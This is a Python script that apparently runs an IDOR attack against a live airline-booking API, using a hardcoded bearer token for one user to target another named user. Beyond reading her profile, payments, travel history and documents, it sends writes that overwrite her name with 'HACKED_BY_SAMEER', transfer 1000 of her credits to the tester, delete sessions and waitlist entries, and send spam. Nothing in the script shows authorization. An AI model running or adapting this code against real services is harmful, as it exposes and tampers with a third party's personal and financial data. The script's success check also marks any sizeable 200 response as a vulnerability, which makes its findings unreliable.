#!/usr/bin/env python3
"""
Comprehensive Cross-User Data Access & IDOR Vulnerability Testing
Tests ALL possible endpoints for Insecure Direct Object Reference vulnerabilities
"""

import requests
import json
from datetime import datetime
from typing import Dict, List, Tuple
import time

# Configuration
BASE_URL = "https://vauntapi.flyvaunt.com"
SAMEER_JWT = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMjMxMTE1LCJleHAiOjE3NjQ4MjMxMTV9.bOz6aK6v9G9B0H2BIXg_N5kWsiBizTbD-v1SlPl3B-Q"
SAMEER_USER_ID = 20254
ASHLEY_USER_ID = 26927

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

class IDORTester:
    def __init__(self):
        self.headers = {
            "Authorization": f"Bearer {SAMEER_JWT}",
            "Content-Type": "application/json"
        }
        self.vulnerabilities = []
        self.test_results = []

    def log(self, message: str, level: str = "INFO"):
        timestamp = datetime.now().strftime("%H:%M:%S")
        color = {
            "INFO": Colors.BLUE,
            "VULN": Colors.RED + Colors.BOLD,
            "SAFE": Colors.GREEN,
            "TEST": Colors.CYAN,
            "WARN": Colors.YELLOW
        }.get(level, "")
        print(f"[{timestamp}] {color}{message}{Colors.END}")

    def add_vulnerability(self, endpoint: str, method: str, description: str,
                         severity: str, data_exposed: str, cvss: float):
        vuln = {
            "endpoint": endpoint,
            "method": method,
            "description": description,
            "severity": severity,
            "data_exposed": data_exposed,
            "cvss_score": cvss,
            "discovered_at": datetime.now().isoformat()
        }
        self.vulnerabilities.append(vuln)
        self.log(f"🚨 VULNERABILITY FOUND: {endpoint} - {description}", "VULN")

    def test_endpoint(self, method: str, endpoint: str, description: str,
                     body: dict = None, expected_status: int = None) -> Tuple[bool, dict]:
        """Test a single endpoint and return (is_vulnerable, response_data)"""
        url = f"{BASE_URL}{endpoint}"
        self.log(f"Testing {method} {endpoint} - {description}", "TEST")

        try:
            if method == "GET":
                response = requests.get(url, headers=self.headers, timeout=10)
            elif method == "POST":
                response = requests.post(url, headers=self.headers, json=body, timeout=10)
            elif method == "PUT":
                response = requests.put(url, headers=self.headers, json=body, timeout=10)
            elif method == "PATCH":
                response = requests.patch(url, headers=self.headers, json=body, timeout=10)
            elif method == "DELETE":
                response = requests.delete(url, headers=self.headers, timeout=10)
            else:
                return False, {}

            result = {
                "status": response.status_code,
                "endpoint": endpoint,
                "method": method,
                "description": description,
                "response_size": len(response.content)
            }

            try:
                result["response"] = response.json()
            except:
                result["response"] = response.text[:500]

            # Check if this is a successful unauthorized access
            is_vulnerable = False
            if response.status_code in [200, 201, 204]:
                # Successful response accessing another user's data
                if str(ASHLEY_USER_ID) in str(response.text):
                    is_vulnerable = True
                    result["vulnerable"] = True
                elif response.status_code == 200 and len(response.content) > 50:
                    # Got substantial data back
                    is_vulnerable = True
                    result["vulnerable"] = True

            result["is_vulnerable"] = is_vulnerable
            self.test_results.append(result)

            if is_vulnerable:
                self.log(f"✓ VULNERABLE - Status {response.status_code}, {len(response.content)} bytes", "VULN")
            else:
                self.log(f"✓ Protected - Status {response.status_code}", "SAFE")

            return is_vulnerable, result

        except Exception as e:
            self.log(f"✗ Error: {str(e)}", "WARN")
            return False, {"error": str(e)}

    def test_user_profile_idor(self):
        """Test 1: User Profile IDOR - Different endpoint patterns"""
        self.log("\n" + "="*80, "INFO")
        self.log("TEST 1: USER PROFILE IDOR (DIFFERENT PATTERNS)", "INFO")
        self.log("="*80, "INFO")

        endpoints = [
            ("GET", f"/v1/user/{ASHLEY_USER_ID}", "V1 user by ID"),
            ("GET", f"/v2/user/{ASHLEY_USER_ID}", "V2 user by ID"),
            ("GET", f"/v3/user/{ASHLEY_USER_ID}", "V3 user by ID"),
            ("GET", f"/v1/users/{ASHLEY_USER_ID}", "V1 users by ID"),
            ("GET", f"/v1/profile/{ASHLEY_USER_ID}", "V1 profile by ID"),
            ("GET", f"/v1/account/{ASHLEY_USER_ID}", "V1 account by ID"),
            ("GET", f"/v1/user?id={ASHLEY_USER_ID}", "V1 user with id param"),
            ("GET", f"/v1/user?userId={ASHLEY_USER_ID}", "V1 user with userId param"),
            ("GET", f"/v2/user?id={ASHLEY_USER_ID}", "V2 user with id param"),
            ("GET", f"/v3/user?id={ASHLEY_USER_ID}", "V3 user with id param"),
        ]

        for method, endpoint, desc in endpoints:
            is_vuln, result = self.test_endpoint(method, endpoint, desc)
            if is_vuln:
                self.add_vulnerability(
                    endpoint, method,
                    f"Can access other user's profile data via {endpoint}",
                    "HIGH", "Full user profile including PII", 7.5
                )
            time.sleep(0.2)

    def test_user_update_idor(self):
        """Test 2: User Update IDOR"""
        self.log("\n" + "="*80, "INFO")
        self.log("TEST 2: USER UPDATE IDOR", "INFO")
        self.log("="*80, "INFO")

        test_body = {"firstName": "HACKED_BY_SAMEER", "lastName": "IDOR_TEST"}

        endpoints = [
            ("PATCH", f"/v1/user/{ASHLEY_USER_ID}", "PATCH user by ID", test_body),
            ("PUT", f"/v1/user/{ASHLEY_USER_ID}", "PUT user by ID", test_body),
            ("POST", f"/v1/user/{ASHLEY_USER_ID}/update", "POST user update", test_body),
            ("PATCH", f"/v2/user/{ASHLEY_USER_ID}", "PATCH V2 user", test_body),
            ("PATCH", f"/v1/users/{ASHLEY_USER_ID}", "PATCH users endpoint", test_body),
            ("POST", f"/v1/user/update", "POST with userId in body", {**test_body, "userId": ASHLEY_USER_ID}),
        ]

        for method, endpoint, desc, body in endpoints:
            is_vuln, result = self.test_endpoint(method, endpoint, desc, body=body)
            if is_vuln:
                self.add_vulnerability(
                    endpoint, method,
                    f"Can modify other user's profile data via {endpoint}",
                    "CRITICAL", "Can modify user's personal information", 9.1
                )
            time.sleep(0.2)

    def test_flight_history_idor(self):
        """Test 3: Flight History IDOR"""
        self.log("\n" + "="*80, "INFO")
        self.log("TEST 3: FLIGHT HISTORY IDOR", "INFO")
        self.log("="*80, "INFO")

        endpoints = [
            ("GET", f"/v1/user/{ASHLEY_USER_ID}/flight-history", "User flight history"),
            ("GET", f"/v1/flight-history?userId={ASHLEY_USER_ID}", "Flight history by userId param"),
            ("GET", f"/v2/flight-history?user={ASHLEY_USER_ID}", "V2 flight history"),
            ("GET", f"/v1/users/{ASHLEY_USER_ID}/flights", "User flights"),
            ("GET", f"/v1/flights?userId={ASHLEY_USER_ID}", "Flights by userId"),
            ("GET", f"/v3/flight-history?user={ASHLEY_USER_ID}", "V3 flight history"),
            ("GET", f"/v1/user/{ASHLEY_USER_ID}/bookings", "User bookings"),
        ]

        for method, endpoint, desc in endpoints:
            is_vuln, result = self.test_endpoint(method, endpoint, desc)
            if is_vuln:
                self.add_vulnerability(
                    endpoint, method,
                    f"Can access other user's flight history via {endpoint}",
                    "HIGH", "Flight history and travel patterns", 6.5
                )
            time.sleep(0.2)

    def test_entrant_waitlist_idor(self):
        """Test 4: Entrant/Waitlist IDOR"""
        self.log("\n" + "="*80, "INFO")
        self.log("TEST 4: ENTRANT/WAITLIST IDOR", "INFO")
        self.log("="*80, "INFO")

        # First, try to get Ashley's entrant ID using v3 parameter injection
        self.log("Attempting to discover Ashley's entrant IDs...", "INFO")

        # Test various entrant IDs (we'll try some common patterns)
        test_entrant_ids = [1, 10, 100, 1000, 5000, 10000, 15000, 20000]

        endpoints = [
            ("GET", f"/v1/entrant/{ASHLEY_USER_ID}", "Get entrant by user ID"),
            ("GET", f"/v1/user/{ASHLEY_USER_ID}/entrants", "Get user's entrants"),
            ("DELETE", f"/v1/entrant/1234", "Delete entrant (test ID)"),
            ("PATCH", f"/v1/entrant/1234", "Modify entrant", {"queuePosition": 999}),
            ("POST", f"/v1/entrant/1234/remove", "Remove entrant"),
            ("GET", f"/v1/waitlist?userId={ASHLEY_USER_ID}", "Waitlist by userId"),
        ]

        for method, endpoint, desc, *body in endpoints:
            body_data = body[0] if body else None
            is_vuln, result = self.test_endpoint(method, endpoint, desc, body=body_data)
            if is_vuln:
                severity = "CRITICAL" if method in ["DELETE", "PATCH", "POST"] else "HIGH"
                cvss = 9.1 if method in ["DELETE", "PATCH", "POST"] else 7.5
                self.add_vulnerability(
                    endpoint, method,
                    f"Can access/modify other user's waitlist entries via {endpoint}",
                    severity, "Waitlist position and entrant data", cvss
                )
            time.sleep(0.2)

    def test_payment_subscription_idor(self):
        """Test 5: Payment/Subscription IDOR"""
        self.log("\n" + "="*80, "INFO")
        self.log("TEST 5: PAYMENT/SUBSCRIPTION IDOR", "INFO")
        self.log("="*80, "INFO")

        endpoints = [
            ("GET", f"/v1/user/{ASHLEY_USER_ID}/subscription", "User subscription"),
            ("GET", f"/v1/subscription?userId={ASHLEY_USER_ID}", "Subscription by userId"),
            ("GET", f"/v1/stripe/customer/{ASHLEY_USER_ID}", "Stripe customer data"),
            ("GET", f"/v1/user/{ASHLEY_USER_ID}/payments", "User payments"),
            ("GET", f"/v1/payment-history?userId={ASHLEY_USER_ID}", "Payment history"),
            ("GET", f"/v1/user/{ASHLEY_USER_ID}/billing", "User billing"),
            ("GET", f"/v1/billing?userId={ASHLEY_USER_ID}", "Billing by userId"),
            ("GET", f"/v2/subscription?user={ASHLEY_USER_ID}", "V2 subscription"),
            ("GET", f"/v1/user/{ASHLEY_USER_ID}/payment-methods", "Payment methods"),
        ]

        for method, endpoint, desc in endpoints:
            is_vuln, result = self.test_endpoint(method, endpoint, desc)
            if is_vuln:
                self.add_vulnerability(
                    endpoint, method,
                    f"Can access other user's payment/subscription data via {endpoint}",
                    "CRITICAL", "Payment information and subscription details", 8.5
                )
            time.sleep(0.2)

    def test_credits_balance_idor(self):
        """Test 6: Credits/Balance IDOR"""
        self.log("\n" + "="*80, "INFO")
        self.log("TEST 6: CREDITS/BALANCE IDOR", "INFO")
        self.log("="*80, "INFO")

        endpoints = [
            ("GET", f"/v1/user/{ASHLEY_USER_ID}/credits", "User credits"),
            ("GET", f"/v1/credits?userId={ASHLEY_USER_ID}", "Credits by userId"),
            ("POST", f"/v1/credits/transfer", "Transfer credits", {
                "from": ASHLEY_USER_ID,
                "to": SAMEER_USER_ID,
                "amount": 1000
            }),
            ("GET", f"/v1/user/{ASHLEY_USER_ID}/balance", "User balance"),
            ("GET", f"/v1/balance?userId={ASHLEY_USER_ID}", "Balance by userId"),
            ("POST", f"/v1/credits/add", "Add credits", {
                "userId": ASHLEY_USER_ID,
                "amount": 5000
            }),
        ]

        for method, endpoint, desc, *body in endpoints:
            body_data = body[0] if body else None
            is_vuln, result = self.test_endpoint(method, endpoint, desc, body=body_data)
            if is_vuln:
                severity = "CRITICAL" if method in ["POST"] else "HIGH"
                cvss = 9.5 if method == "POST" else 7.5
                self.add_vulnerability(
                    endpoint, method,
                    f"Can access/manipulate other user's credits via {endpoint}",
                    severity, "Financial credits and balance", cvss
                )
            time.sleep(0.2)

    def test_settings_preferences_idor(self):
        """Test 7: Settings/Preferences IDOR"""
        self.log("\n" + "="*80, "INFO")
        self.log("TEST 7: SETTINGS/PREFERENCES IDOR", "INFO")
        self.log("="*80, "INFO")

        test_settings = {"emailNotifications": False, "language": "hacked"}

        endpoints = [
            ("GET", f"/v1/user/{ASHLEY_USER_ID}/settings", "User settings"),
            ("PATCH", f"/v1/user/{ASHLEY_USER_ID}/settings", "Update settings", test_settings),
            ("GET", f"/v1/settings?userId={ASHLEY_USER_ID}", "Settings by userId"),
            ("GET", f"/v1/user/{ASHLEY_USER_ID}/preferences", "User preferences"),
            ("PATCH", f"/v1/preferences", "Update preferences", {
                "userId": ASHLEY_USER_ID,
                **test_settings
            }),
        ]

        for method, endpoint, desc, *body in endpoints:
            body_data = body[0] if body else None
            is_vuln, result = self.test_endpoint(method, endpoint, desc, body=body_data)
            if is_vuln:
                severity = "MEDIUM" if method == "GET" else "HIGH"
                cvss = 5.5 if method == "GET" else 7.5
                self.add_vulnerability(
                    endpoint, method,
                    f"Can access/modify other user's settings via {endpoint}",
                    severity, "User preferences and settings", cvss
                )
            time.sleep(0.2)

    def test_notifications_idor(self):
        """Test 8: Notifications IDOR"""
        self.log("\n" + "="*80, "INFO")
        self.log("TEST 8: NOTIFICATIONS IDOR", "INFO")
        self.log("="*80, "INFO")

        endpoints = [
            ("GET", f"/v1/user/{ASHLEY_USER_ID}/notifications", "User notifications"),
            ("GET", f"/v1/notifications?userId={ASHLEY_USER_ID}", "Notifications by userId"),
            ("POST", f"/v1/notifications/send", "Send notification", {
                "userId": ASHLEY_USER_ID,
                "message": "Spam from Sameer"
            }),
            ("DELETE", f"/v1/user/{ASHLEY_USER_ID}/notifications", "Delete notifications"),
        ]

        for method, endpoint, desc, *body in endpoints:
            body_data = body[0] if body else None
            is_vuln, result = self.test_endpoint(method, endpoint, desc, body=body_data)
            if is_vuln:
                severity = "MEDIUM" if method == "GET" else "HIGH"
                cvss = 5.5 if method == "GET" else 7.0
                self.add_vulnerability(
                    endpoint, method,
                    f"Can access/manipulate other user's notifications via {endpoint}",
                    severity, "Notification data", cvss
                )
            time.sleep(0.2)

    def test_session_token_idor(self):
        """Test 9: Session/Token IDOR"""
        self.log("\n" + "="*80, "INFO")
        self.log("TEST 9: SESSION/TOKEN IDOR", "INFO")
        self.log("="*80, "INFO")

        endpoints = [
            ("GET", f"/v1/user/{ASHLEY_USER_ID}/sessions", "User sessions"),
            ("GET", f"/v1/session?userId={ASHLEY_USER_ID}", "Session by userId"),
            ("DELETE", f"/v1/user/{ASHLEY_USER_ID}/sessions", "Force logout user"),
            ("GET", f"/v1/user/{ASHLEY_USER_ID}/tokens", "User tokens"),
            ("DELETE", f"/v1/tokens?userId={ASHLEY_USER_ID}", "Delete user tokens"),
        ]

        for method, endpoint, desc in endpoints:
            is_vuln, result = self.test_endpoint(method, endpoint, desc)
            if is_vuln:
                severity = "CRITICAL" if method == "DELETE" else "HIGH"
                cvss = 8.5 if method == "DELETE" else 7.0
                self.add_vulnerability(
                    endpoint, method,
                    f"Can access/terminate other user's sessions via {endpoint}",
                    severity, "Session and authentication tokens", cvss
                )
            time.sleep(0.2)

    def test_referral_idor(self):
        """Test 10: Referral IDOR"""
        self.log("\n" + "="*80, "INFO")
        self.log("TEST 10: REFERRAL IDOR", "INFO")
        self.log("="*80, "INFO")

        endpoints = [
            ("GET", f"/v1/user/{ASHLEY_USER_ID}/referrals", "User referrals"),
            ("GET", f"/v1/referral?referrerId={ASHLEY_USER_ID}", "Referral by referrerId"),
            ("POST", f"/v1/referral/steal", "Steal referral", {"fromUser": ASHLEY_USER_ID}),
            ("GET", f"/v1/user/{ASHLEY_USER_ID}/referral-code", "User referral code"),
        ]

        for method, endpoint, desc, *body in endpoints:
            body_data = body[0] if body else None
            is_vuln, result = self.test_endpoint(method, endpoint, desc, body=body_data)
            if is_vuln:
                severity = "CRITICAL" if method == "POST" else "MEDIUM"
                cvss = 8.0 if method == "POST" else 5.5
                self.add_vulnerability(
                    endpoint, method,
                    f"Can access/manipulate other user's referrals via {endpoint}",
                    severity, "Referral data and credits", cvss
                )
            time.sleep(0.2)

    def test_documents_files_idor(self):
        """Test 11: Documents/Files IDOR"""
        self.log("\n" + "="*80, "INFO")
        self.log("TEST 11: DOCUMENTS/FILES IDOR", "INFO")
        self.log("="*80, "INFO")

        endpoints = [
            ("GET", f"/v1/user/{ASHLEY_USER_ID}/documents", "User documents"),
            ("GET", f"/v1/user/{ASHLEY_USER_ID}/license", "User license"),
            ("GET", f"/v1/files?userId={ASHLEY_USER_ID}", "Files by userId"),
            ("GET", f"/v1/user/{ASHLEY_USER_ID}/uploads", "User uploads"),
            ("GET", f"/v1/documents?userId={ASHLEY_USER_ID}", "Documents by userId"),
        ]

        for method, endpoint, desc in endpoints:
            is_vuln, result = self.test_endpoint(method, endpoint, desc)
            if is_vuln:
                self.add_vulnerability(
                    endpoint, method,
                    f"Can access other user's documents/files via {endpoint}",
                    "HIGH", "Personal documents including licenses", 7.5
                )
            time.sleep(0.2)

    def test_admin_user_enumeration(self):
        """Test 12: Admin User Enumeration"""
        self.log("\n" + "="*80, "INFO")
        self.log("TEST 12: ADMIN USER ENUMERATION", "INFO")
        self.log("="*80, "INFO")

        endpoints = [
            ("GET", "/v1/users", "List all users"),
            ("GET", "/v1/users?limit=9999", "List users with high limit"),
            ("GET", "/v1/users?showAll=true", "List all users with showAll"),
            ("GET", "/v1/admin/users", "Admin users endpoint"),
            ("GET", "/v2/users/list", "V2 users list"),
            ("GET", "/v3/users", "V3 users list"),
            ("GET", "/v1/user/all", "All users endpoint"),
        ]

        for method, endpoint, desc in endpoints:
            is_vuln, result = self.test_endpoint(method, endpoint, desc)
            if is_vuln:
                self.add_vulnerability(
                    endpoint, method,
                    f"Can enumerate all users in system via {endpoint}",
                    "HIGH", "All user data in system", 7.5
                )
            time.sleep(0.2)

    def test_wildcard_batch_operations(self):
        """Test 13: Wildcard/Batch Operations"""
        self.log("\n" + "="*80, "INFO")
        self.log("TEST 13: WILDCARD/BATCH OPERATIONS", "INFO")
        self.log("="*80, "INFO")

        endpoints = [
            ("GET", "/v1/user/*/profile", "Wildcard user profile"),
            ("POST", "/v1/user/bulk-update", "Bulk update users", {
                "users": [ASHLEY_USER_ID, SAMEER_USER_ID],
                "data": {"firstName": "Hacked"}
            }),
            ("DELETE", "/v1/user/*/sessions", "Wildcard session delete"),
            ("GET", "/v1/user/all/data", "All user data"),
        ]

        for method, endpoint, desc, *body in endpoints:
            body_data = body[0] if body else None
            is_vuln, result = self.test_endpoint(method, endpoint, desc, body=body_data)
            if is_vuln:
                severity = "CRITICAL" if method in ["POST", "DELETE"] else "HIGH"
                cvss = 9.5 if method in ["POST", "DELETE"] else 8.0
                self.add_vulnerability(
                    endpoint, method,
                    f"Can perform bulk operations on users via {endpoint}",
                    severity, "Multiple user accounts", cvss
                )
            time.sleep(0.2)

    def test_indirect_idor(self):
        """Test 14: Indirect IDOR via Relationships"""
        self.log("\n" + "="*80, "INFO")
        self.log("TEST 14: INDIRECT IDOR VIA RELATIONSHIPS", "INFO")
        self.log("="*80, "INFO")

        # Test accessing user data through related entities
        test_flight_id = 1234
        test_entrant_id = 5678

        endpoints = [
            ("GET", f"/v1/flight/{test_flight_id}/entrants/user", "User via flight entrants"),
            ("GET", f"/v1/entrant/{test_entrant_id}/profile", "Profile via entrant"),
            ("GET", f"/v1/entrant/{test_entrant_id}/user", "User via entrant"),
            ("GET", f"/v1/booking/{test_flight_id}/user", "User via booking"),
        ]

        for method, endpoint, desc in endpoints:
            is_vuln, result = self.test_endpoint(method, endpoint, desc)
            if is_vuln:
                self.add_vulnerability(
                    endpoint, method,
                    f"Can access user data indirectly via {endpoint}",
                    "HIGH", "User data via relationship", 7.5
                )
            time.sleep(0.2)

    def test_verbose_errors(self):
        """Test 15: Verbose Error Messages"""
        self.log("\n" + "="*80, "INFO")
        self.log("TEST 15: VERBOSE ERROR MESSAGES & USER ENUMERATION", "INFO")
        self.log("="*80, "INFO")

        test_ids = [
            99999999,  # Very large ID
            0,         # Zero
            -1,        # Negative
            "admin",   # String
            "null",    # Null string
        ]

        for test_id in test_ids:
            endpoint = f"/v1/user/{test_id}"
            is_vuln, result = self.test_endpoint("GET", endpoint, f"Test user ID: {test_id}")

            # Check if error messages leak information
            if result.get("response"):
                response_text = str(result["response"]).lower()
                if any(keyword in response_text for keyword in ["user not found", "invalid user", "does not exist"]):
                    self.log(f"⚠ Verbose error for ID {test_id}: {response_text[:100]}", "WARN")

            time.sleep(0.2)

    def generate_report(self):
        """Generate comprehensive vulnerability report"""
        self.log("\n" + "="*80, "INFO")
        self.log("GENERATING VULNERABILITY REPORT", "INFO")
        self.log("="*80, "INFO")

        report = []
        report.append("# CROSS-USER DATA ACCESS & IDOR VULNERABILITY ASSESSMENT")
        report.append(f"**Assessment Date:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        report.append(f"**Target:** {BASE_URL}")
        report.append(f"**Tester:** Sameer (User ID: {SAMEER_USER_ID})")
        report.append(f"**Target User:** Ashley (User ID: {ASHLEY_USER_ID})")
        report.append("")

        # Executive Summary
        report.append("## EXECUTIVE SUMMARY")
        report.append("")
        vuln_count = len(self.vulnerabilities)
        critical_count = sum(1 for v in self.vulnerabilities if v["severity"] == "CRITICAL")
        high_count = sum(1 for v in self.vulnerabilities if v["severity"] == "HIGH")
        medium_count = sum(1 for v in self.vulnerabilities if v["severity"] == "MEDIUM")

        report.append(f"**Total Vulnerabilities Found:** {vuln_count}")
        report.append(f"- CRITICAL: {critical_count}")
        report.append(f"- HIGH: {high_count}")
        report.append(f"- MEDIUM: {medium_count}")
        report.append("")

        # Quick Answers
        can_access_profile = any("profile" in v["endpoint"].lower() for v in self.vulnerabilities)
        can_modify_data = any(v["method"] in ["PATCH", "PUT", "POST", "DELETE"] for v in self.vulnerabilities)
        can_access_payment = any("payment" in v["endpoint"].lower() or "subscription" in v["endpoint"].lower() or "billing" in v["endpoint"].lower() for v in self.vulnerabilities)
        can_enumerate_users = any("users" in v["endpoint"] and "list" in v["description"].lower() for v in self.vulnerabilities)

        report.append("### CRITICAL QUESTIONS")
        report.append("")
        report.append(f"**Can user access other users' profiles?** {'YES ⚠️' if can_access_profile else 'NO ✓'}")
        report.append(f"**Can user modify other users' data?** {'YES ⚠️' if can_modify_data else 'NO ✓'}")
        report.append(f"**Can user access payment info?** {'YES ⚠️' if can_access_payment else 'NO ✓'}")
        report.append(f"**Can user enumerate all users?** {'YES ⚠️' if can_enumerate_users else 'NO ✓'}")
        report.append("")

        # Detailed Vulnerabilities
        if self.vulnerabilities:
            report.append("## DETAILED VULNERABILITY FINDINGS")
            report.append("")

            for i, vuln in enumerate(sorted(self.vulnerabilities, key=lambda x: x["cvss_score"], reverse=True), 1):
                report.append(f"### {i}. {vuln['description']}")
                report.append("")
                report.append(f"**Endpoint:** `{vuln['method']} {vuln['endpoint']}`")
                report.append(f"**Severity:** {vuln['severity']}")
                report.append(f"**CVSS Score:** {vuln['cvss_score']}")
                report.append(f"**Data Exposed:** {vuln['data_exposed']}")
                report.append("")
                report.append("**Impact:**")
                report.append(f"- Unauthorized access to {vuln['data_exposed']}")
                report.append(f"- Privacy violation")
                if vuln['method'] in ['PATCH', 'PUT', 'POST', 'DELETE']:
                    report.append(f"- Potential data manipulation/deletion")
                report.append("")
                report.append("**Recommendation:**")
                report.append("- Implement proper authorization checks")
                report.append("- Verify user owns the resource before allowing access")
                report.append("- Add server-side validation for user ID matching authenticated user")
                report.append("")
                report.append("---")
                report.append("")
        else:
            report.append("## NO IDOR VULNERABILITIES FOUND")
            report.append("")
            report.append("All tested endpoints properly implement authorization controls.")
            report.append("")

        # Test Statistics
        report.append("## TEST STATISTICS")
        report.append("")
        report.append(f"**Total Tests Executed:** {len(self.test_results)}")

        successful_tests = sum(1 for r in self.test_results if r.get("status") == 200)
        report.append(f"**Successful Responses (200 OK):** {successful_tests}")

        error_tests = sum(1 for r in self.test_results if r.get("status", 0) >= 400)
        report.append(f"**Error Responses (4xx/5xx):** {error_tests}")
        report.append("")

        # Testing Methodology
        report.append("## TESTING METHODOLOGY")
        report.append("")
        report.append("The following attack vectors were tested:")
        report.append("")
        report.append("1. **User Profile IDOR** - Different endpoint patterns (v1, v2, v3, query params)")
        report.append("2. **User Update IDOR** - Modification of other users' data")
        report.append("3. **Flight History IDOR** - Access to travel history")
        report.append("4. **Entrant/Waitlist IDOR** - Waitlist manipulation")
        report.append("5. **Payment/Subscription IDOR** - Financial data access")
        report.append("6. **Credits/Balance IDOR** - Credit manipulation")
        report.append("7. **Settings/Preferences IDOR** - User preferences access")
        report.append("8. **Notifications IDOR** - Notification access/spam")
        report.append("9. **Session/Token IDOR** - Session hijacking/termination")
        report.append("10. **Referral IDOR** - Referral data access")
        report.append("11. **Documents/Files IDOR** - Document access")
        report.append("12. **Admin User Enumeration** - List all users")
        report.append("13. **Wildcard/Batch Operations** - Bulk operations")
        report.append("14. **Indirect IDOR** - Access via relationships")
        report.append("15. **Verbose Errors** - Information leakage")
        report.append("")

        return "\n".join(report)

    def run_all_tests(self):
        """Execute all IDOR tests"""
        self.log(f"\n{Colors.BOLD}{Colors.CYAN}╔{'═'*78}╗{Colors.END}")
        self.log(f"{Colors.BOLD}{Colors.CYAN}║{' '*78}║{Colors.END}")
        self.log(f"{Colors.BOLD}{Colors.CYAN}║  COMPREHENSIVE CROSS-USER DATA ACCESS & IDOR VULNERABILITY ASSESSMENT{' '*7}║{Colors.END}")
        self.log(f"{Colors.BOLD}{Colors.CYAN}║{' '*78}║{Colors.END}")
        self.log(f"{Colors.BOLD}{Colors.CYAN}╚{'═'*78}╝{Colors.END}\n")

        self.log(f"Testing as: Sameer (ID: {SAMEER_USER_ID})", "INFO")
        self.log(f"Target: Ashley (ID: {ASHLEY_USER_ID})", "INFO")
        self.log(f"Base URL: {BASE_URL}\n", "INFO")

        # Run all test categories
        self.test_user_profile_idor()
        self.test_user_update_idor()
        self.test_flight_history_idor()
        self.test_entrant_waitlist_idor()
        self.test_payment_subscription_idor()
        self.test_credits_balance_idor()
        self.test_settings_preferences_idor()
        self.test_notifications_idor()
        self.test_session_token_idor()
        self.test_referral_idor()
        self.test_documents_files_idor()
        self.test_admin_user_enumeration()
        self.test_wildcard_batch_operations()
        self.test_indirect_idor()
        self.test_verbose_errors()

        # Generate and save report
        report = self.generate_report()

        # Save report
        report_path = "/home/user/vaunt/CROSS_USER_DATA_ACCESS_RESULTS.md"
        with open(report_path, "w") as f:
            f.write(report)

        self.log(f"\n{Colors.GREEN}Report saved to: {report_path}{Colors.END}", "INFO")

        # Save detailed results JSON
        json_path = "/home/user/vaunt/api_testing/idor_test_results.json"
        with open(json_path, "w") as f:
            json.dump({
                "vulnerabilities": self.vulnerabilities,
                "test_results": self.test_results,
                "summary": {
                    "total_vulnerabilities": len(self.vulnerabilities),
                    "critical": sum(1 for v in self.vulnerabilities if v["severity"] == "CRITICAL"),
                    "high": sum(1 for v in self.vulnerabilities if v["severity"] == "HIGH"),
                    "medium": sum(1 for v in self.vulnerabilities if v["severity"] == "MEDIUM"),
                    "total_tests": len(self.test_results)
                }
            }, f, indent=2)

        self.log(f"{Colors.GREEN}JSON results saved to: {json_path}{Colors.END}", "INFO")

        # Final summary
        self.log("\n" + "="*80, "INFO")
        self.log("ASSESSMENT COMPLETE", "INFO")
        self.log("="*80, "INFO")
        self.log(f"Total Vulnerabilities Found: {len(self.vulnerabilities)}",
                 "VULN" if self.vulnerabilities else "SAFE")
        self.log(f"Total Tests Executed: {len(self.test_results)}", "INFO")

        return self.vulnerabilities, self.test_results


if __name__ == "__main__":
    tester = IDORTester()
    vulnerabilities, results = tester.run_all_tests()

    print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}FINAL SUMMARY{Colors.END}")
    print(f"{Colors.BOLD}{Colors.CYAN}{'='*80}{Colors.END}")

    if vulnerabilities:
        print(f"\n{Colors.RED}{Colors.BOLD}⚠️  {len(vulnerabilities)} IDOR VULNERABILITIES DISCOVERED{Colors.END}")
        print(f"\n{Colors.YELLOW}Review the detailed report at:{Colors.END}")
        print(f"{Colors.CYAN}/home/user/vaunt/CROSS_USER_DATA_ACCESS_RESULTS.md{Colors.END}")
    else:
        print(f"\n{Colors.GREEN}{Colors.BOLD}✓ No IDOR vulnerabilities found{Colors.END}")
        print(f"{Colors.GREEN}All endpoints properly implement authorization controls{Colors.END}")
